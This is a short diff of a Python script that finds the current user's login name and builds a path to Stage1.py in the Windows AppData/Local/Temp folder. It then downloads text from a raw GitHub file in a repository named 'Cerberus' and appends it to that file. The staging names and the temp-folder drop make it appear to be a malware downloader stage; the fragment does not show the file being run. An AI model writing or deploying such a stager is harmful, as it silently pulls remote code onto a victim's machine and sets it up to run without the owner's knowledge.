@@ -4,13 +4,13 @@ from bs4 import BeautifulSoup
 
 x = os.getlogin()
 
-path = os.path.join("AppData/Local/Temp/Stage2.py")
+path = ("/Users/" + str(os.getlogin()) + "/AppData/Local/Temp/Stage1.py")
 
 if os.path.isfile(path) == False:
     file = open('Stage2.py', 'a')
     file.close()
 
-filename = os.path.join("AppData/Local/Temp/THost.bat")
+filename = path
 with urllib.request.urlopen("https://raw.githubusercontent.com/paramkudle/Cerberus/main/TSource1.txt") as response:
     data = response.read().decode("utf-8")
     with open(filename, "a+") as fp: fp.write(data)
